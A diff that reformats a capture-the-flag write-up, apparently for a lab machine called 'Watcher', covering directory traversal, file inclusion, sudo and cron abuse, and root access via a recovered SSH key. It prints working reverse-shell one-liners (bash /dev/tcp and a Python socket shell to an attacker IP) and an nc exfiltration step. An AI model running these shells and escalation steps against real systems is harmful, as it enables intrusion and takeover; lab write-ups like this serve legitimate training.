@@ -91,6 +91,7 @@ Niktoscan
   ![](images/robot.txt.png)
   - Secret File not accessable
 ##### flag_1.txt
+
 ![](images/20230707155735.png)
 
 ### Directory Traversal possible
@@ -100,23 +101,31 @@ Niktoscan
 - mat
 - ftpuser
 - will
--> Sensitive file: Secret file do not read
-  ![](images/20230707162723.png)
--> Access to ftp
-  ![](images/20230707163026.png)
+Sensitive file: Secret file do not read
+
+![](images/20230707162723.png)
+Access to ftp
+
+![](images/20230707163026.png)
 ##### flag_2.txt
 ![](images/20230707163105.png)
 #### Local File Inclusion
--> Possible to add (pentestmonkey)php-reverse shell in files
+Possible to add (pentestmonkey)php-reverse shell in files
 Save location: `/home/ftpuser/ftp/files/rev_shell.php`
 Access via Meterpreter/Metasploit
+
 ![](images/flag_locations.png)
 ##### Flag_3.txt:
+
 ![](images/20230707163842.png)
+
 Can execute sudo without password
+
 ![](images/20230707164347.png)
+
 Spawn a shell: `sudo -u toby /bin/bash`
 Access flag_4.txt and download to attacker with nc
+
 ![](images/20230707164754.png)
 There is a note
 ```shell
@@ -132,11 +141,13 @@ Mat
 #
 */1 * * * * mat /home/toby/jobs/cow.sh
 ```
--> Every Minute cow.sh script is running
+Every Minute cow.sh script is running
+
 ![](images/20230707165303.png)
 Its modifiable
 `toby@watcher:/home/toby/jobs$ echo '/bin/bash -i >& /dev/tcp/10.18.90.87/4444 0>&1' >> cow.sh`
 ##### flag_5.txt
+
 ![](images/20230707173036.png)
 Found note:
 ```shell
@@ -164,7 +175,9 @@ Edit cmd.py which is called by will_script.py
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.90.87",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> cmd.py
 ```
 `sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1`
--> Got Access with will
+
+Got Access with will
+
 ![](images/20230707174117.png)
 ```shell
 sudo -l
@@ -180,7 +193,7 @@ find / -group adm 2>/dev/null
 /opt/backups
 /opt/backups/key.b64
 ```
--> Found id_rsa base64 encoded
+Found id_rsa base64 encoded
 Connect as Root
 ```shell
 ssh -i id_rsa root@10.10.56.139
